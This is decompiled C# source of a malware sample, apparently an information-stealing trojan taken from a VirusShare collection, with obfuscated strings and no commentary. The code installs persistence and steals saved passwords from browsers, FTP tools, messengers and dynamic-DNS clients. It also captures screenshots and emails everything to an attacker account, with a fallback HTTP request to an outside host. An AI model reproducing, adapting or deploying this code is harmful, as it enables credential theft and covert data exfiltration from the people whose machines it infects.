// Decompiled with JetBrains decompiler
// Type: NTUIYURW
// Assembly: Script Master v7, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: C455AE42-10CE-458F-A8B3-AF5A9B9CC8DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-eeafb61ec37b2a763da8693f22cd1ef63e43485408848c106d517b546e13c487.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;

public class NTUIYURW
{
  public static string NOMBKE;
  public static string QEFKD;
  public static string PRLLJ;
  public static string FFInfo;
  public static string RGCWC;
  public static string MSTUG;
  public static string MVUKM;
  public static string JGUON;
  public static string QDSHCHY;
  public static string IQJJIGG;
  public static string LPGRPPC;
  public static string WNKBHEQ;
  public static string CEGKPHV;
  public static string YIGWEOPP;
  public static string KSQKXQN = "";
  public static string PNPIWT = GOSLWHR.WHJBIYT("mZuoxqORpaq+foanprWqTZ20uSs=", "False");
  public static string OTCKCI = GOSLWHR.WHJBIYT("fqiwv6d8pHV6ais=", "False");
  public static string OLSECGTX = GOSLWHR.WHJBIYT("kqe5vGyGp6a1qk2dtLkr", "False");
  public static int JRTBUMFP = 587;
  public static string WXQBQYBX = GOSLWHR.WHJBIYT("DLEXSite", "False");
  public static string CIOUBCOI = GOSLWHR.WHJBIYT("USERSITE", "False");
  public static string KNSLICKO = GOSLWHR.WHJBIYT("USERTYPE", "False");
  public static string TOQUL = GOSLWHR.WHJBIYT("USERTITLE", "False");
  public static string USRSF = GOSLWHR.WHJBIYT("USERBODY", "False");
  public static string TCGXU = GOSLWHR.WHJBIYT("USERSCREENSHOTS", "False");
  public static string GFGXH = GOSLWHR.WHJBIYT("gbfN278L", "False");
  public static int HSQTT = 1200000;
  public static string IUSWG = "";
  public static string JOJFO = "";
  public static int number = 0;
  public static VPXNIVH GLGWPJK;
  public static Thread RKUSLCK = new Thread(new ThreadStart(NTUIYURW.GVCLT));
  public static Thread GCThread = new Thread(new ThreadStart(DAChrome.GTCHRME));
  public static Thread JSIUE = new Thread(new ThreadStart(NTUIYURW.GKKNH));
  public static Thread STRTTHRD = new Thread(new ThreadStart(DAStartup.Startupdll.StartPers));
  public static Thread IDMThread = new Thread(new ThreadStart(DAIDM.IDMdll.GTMYIDM));
  public static Thread CREFTPThread = new Thread(new ThreadStart(DACore.Coredll.GTMYCore));
  public static Thread NMBZZThread = new Thread(new ThreadStart(DANMBZZ.NMBZZdll.nimmbuzz));
  public static Thread PGDNThread = new Thread(new ThreadStart(DAPGDN.PGDNdll.GTMYPig));
  public static Thread SMRTFTPThread = new Thread(new ThreadStart(DASMRTFTP.Smartdll.GTMYSmart));
  public static Thread DynDNSThread = new Thread(new ThreadStart(DADynDNS.DynDNSdll.GetDADyn));
  public static Thread NoipThread = new Thread(new ThreadStart(DANoip.Noipdll.GTMYNo));

  [STAThread]
  public static void Main()
  {
    int num1;
    try
    {
      Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5);
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, "*.png*"))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.STRTTHRD.IsBackground = true;
      NTUIYURW.STRTTHRD.Start();
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    int num2 = 0;
    int num3;
    while (true)
    {
      num3 = 1;
      try
      {
        if (num2 == 3)
          Application.Restart();
        NTUIYURW.GLGWPJK = new VPXNIVH(NTUIYURW.JOJFO);
        VPXNIVH.HFJBSVH();
        break;
      }
      catch (Exception ex)
      {
        int lErl = num3;
        ProjectData.SetProjectError(ex, lErl);
        checked { ++num2; }
        ProjectData.ClearProjectError();
      }
    }
    try
    {
      NTUIYURW.RKUSLCK.IsBackground = true;
      NTUIYURW.RKUSLCK.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.GCThread.IsBackground = true;
      NTUIYURW.GCThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      new DASafari.SFRIDL().SAFRGT();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      DAOpera.Operaz operaz = new DAOpera.Operaz();
      DAOpera.Operaz.FPQX();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("k6SwpsWrgMHGEw==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("jZnAwcKgv8bExI2OuMG7przKuqKEjsbSfpWuFw==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("goa8vKhosMCvmIu1wLyzjbSotKiJsMHBuZkh", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("iZW8vb6cu8LAwImKtL23orjGtq2Qq8LPuqG7Gw==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("jZ640LVzu8u9kZSvxtO+pb+Fx76aFg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("lqLJysupyM/NzZaXwcrEr8XTw6ubx8WpyK60ocq8qcrO28xovs7QEA==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("mYbQ08qiu9XLwrG0z8vPscTS0cWrCg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("gIyztLWTsrm3t4CBq7Suma+9ra+Fsr69sououCU=", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("g4S2yKmWq7uwvYiuubm6VaauyCM=", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("l6PKy8yqydDOzpeYwsvFsMbUxNGcws3Nzmm6wtwP", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("k6XN08qguNbAyZzG0c3EnsUR", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("gY20tbaUs7q4uIGCrLWvmrC+rreKtL+7soyzIw==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("hou5w66ErrzDqoa4ucuul6a+uLCPt37PtpYd", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("jprBwsOhwMfFxY6PucK8p73Lu5ebub3Zup65ubK6prLLjcmfuRY=", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.IDMThread.IsBackground = true;
      NTUIYURW.IDMThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.CREFTPThread.IsBackground = true;
      NTUIYURW.CREFTPThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.NMBZZThread.IsBackground = true;
      NTUIYURW.NMBZZThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.PGDNThread.IsBackground = true;
      NTUIYURW.PGDNThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.SMRTFTPThread.IsBackground = true;
      NTUIYURW.SMRTFTPThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      DAMSN.MSNdll.GTMSN();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.DynDNSThread.IsBackground = true;
      NTUIYURW.DynDNSThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.NoipThread.IsBackground = true;
      NTUIYURW.NoipThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      NTUIYURW.JSIUE.IsBackground = true;
      NTUIYURW.JSIUE.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().WaitForExit();
  }

  public static void QECQV(ref double YQPWO)
  {
    try
    {
      DateTime t2 = DateAndTime.Now.AddSeconds(YQPWO);
      while (DateTime.Compare(DateAndTime.Now, t2) < 0)
        Application.DoEvents();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void GVCLT()
  {
    while (true)
    {
      Thread.Sleep(NTUIYURW.HSQTT);
      string str1 = "";
      double YQPWO1 = 0.2;
      NTUIYURW.QECQV(ref YQPWO1);
      string str2;
      try
      {
        WebClient webClient = new WebClient();
        str2 = GOSLWHR.WHJBIYT("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(GOSLWHR.WHJBIYT("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str2 = "";
        ProjectData.ClearProjectError();
      }
      double YQPWO2 = 1.0;
      NTUIYURW.QECQV(ref YQPWO2);
      try
      {
        if (Operators.CompareString(NTUIYURW.TCGXU, GOSLWHR.WHJBIYT("mNHf1gY=", "False"), false) == 0)
        {
          Rectangle bounds = Screen.PrimaryScreen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
          bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + NTUIYURW.number.ToString() + GOSLWHR.WHJBIYT("ZsPMzBI=", "False"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      double YQPWO3 = 0.3;
      NTUIYURW.QECQV(ref YQPWO3);
      try
      {
        if (Operators.CompareString(NTUIYURW.JOJFO, "", false) != 0)
        {
          NTUIYURW.IUSWG = NTUIYURW.JOJFO + Environment.NewLine + Environment.NewLine + str2 + Environment.NewLine + Environment.NewLine + str1;
          try
          {
            MailMessage message = new MailMessage();
            MailMessage mailMessage = message;
            mailMessage.From = new MailAddress(NTUIYURW.PNPIWT);
            mailMessage.To.Add(NTUIYURW.PNPIWT);
            mailMessage.Subject = GOSLWHR.WHJBIYT("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + GOSLWHR.WHJBIYT("aQ0=", "False") + Environment.MachineName.ToString();
            mailMessage.Body = NTUIYURW.IUSWG;
            try
            {
              if (Operators.CompareString(NTUIYURW.TCGXU, GOSLWHR.WHJBIYT("mNHf1gY=", "False"), false) == 0)
              {
                Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + NTUIYURW.number.ToString() + GOSLWHR.WHJBIYT("ZsPMzBI=", "False"));
                mailMessage.Attachments.Add(attachment);
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            new SmtpClient(NTUIYURW.OLSECGTX)
            {
              Port = NTUIYURW.JRTBUMFP,
              EnableSsl = true,
              Credentials = ((ICredentialsByHost) new NetworkCredential(NTUIYURW.PNPIWT, NTUIYURW.OTCKCI))
            }.Send(message);
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            try
            {
              HttpWebResponse response = (HttpWebResponse) WebRequest.Create("http://lls.3owl.com/zztop.php" + "?to=" + NTUIYURW.PNPIWT + "&subject=" + Strings.Replace(GOSLWHR.WHJBIYT("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + GOSLWHR.WHJBIYT("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20") + "&message=" + Strings.Replace(NTUIYURW.IUSWG, " ", "%20") + "&from=" + NTUIYURW.PNPIWT).GetResponse();
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      NTUIYURW.IUSWG = "";
      NTUIYURW.JOJFO = "";
      NTUIYURW.KSQKXQN = "";
      checked { ++NTUIYURW.number; }
    }
  }

  public static void GKKNH()
  {
    int length = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("eoatrq+NrLOxsXp7pa6ok6m3pyw=", GOSLWHR.WHJBIYT("g7nP3cEJ", "False"))).Length;
    FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("eoatrq+NrLOxsXp7pa6ok6m3pyw=", GOSLWHR.WHJBIYT("g7nP3cEJ", "False"))).GetFiles();
    try
    {
      double YQPWO = 25.0;
      NTUIYURW.QECQV(ref YQPWO);
      string str = NTUIYURW.NOMBKE.ToString() + Environment.NewLine + Environment.NewLine + NTUIYURW.QEFKD + Environment.NewLine + Environment.NewLine + NTUIYURW.PRLLJ + Environment.NewLine + Environment.NewLine + NTUIYURW.RGCWC + Environment.NewLine + Environment.NewLine + NTUIYURW.MSTUG + Environment.NewLine + Environment.NewLine + NTUIYURW.MVUKM + Environment.NewLine + Environment.NewLine + NTUIYURW.JGUON + Environment.NewLine + Environment.NewLine + NTUIYURW.QDSHCHY + Environment.NewLine + Environment.NewLine + NTUIYURW.LPGRPPC + Environment.NewLine + Environment.NewLine + NTUIYURW.WNKBHEQ + Environment.NewLine + Environment.NewLine + NTUIYURW.CEGKPHV + Environment.NewLine + Environment.NewLine + NTUIYURW.YIGWEOPP;
      if (!(Operators.CompareString(str, "", false) != 0 | Operators.CompareString(str, (string) null, false) != 0))
        return;
      try
      {
        MailMessage message = new MailMessage();
        MailMessage mailMessage = message;
        mailMessage.From = new MailAddress(NTUIYURW.PNPIWT);
        mailMessage.To.Add(NTUIYURW.PNPIWT);
        mailMessage.Subject = GOSLWHR.WHJBIYT("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + GOSLWHR.WHJBIYT("aQ0=", GOSLWHR.WHJBIYT("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
        mailMessage.Body = str;
        try
        {
          FileInfo[] fileInfoArray = files;
          int index = 0;
          while (index < fileInfoArray.Length)
          {
            Attachment attachment = new Attachment(fileInfoArray[index].FullName);
            mailMessage.Attachments.Add(attachment);
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        new SmtpClient(NTUIYURW.OLSECGTX)
        {
          Port = NTUIYURW.JRTBUMFP,
          EnableSsl = true,
          Credentials = ((ICredentialsByHost) new NetworkCredential(NTUIYURW.PNPIWT, NTUIYURW.OTCKCI))
        }.Send(message);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          HttpWebResponse response = (HttpWebResponse) WebRequest.Create("http://lls.3owl.com/zztop.php" + "?to=" + NTUIYURW.PNPIWT + "&subject=" + Strings.Replace(GOSLWHR.WHJBIYT("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + GOSLWHR.WHJBIYT("aQ0=", GOSLWHR.WHJBIYT("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20") + "&message=" + Strings.Replace(str, " ", "%20") + "&from=" + NTUIYURW.PNPIWT).GetResponse();
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
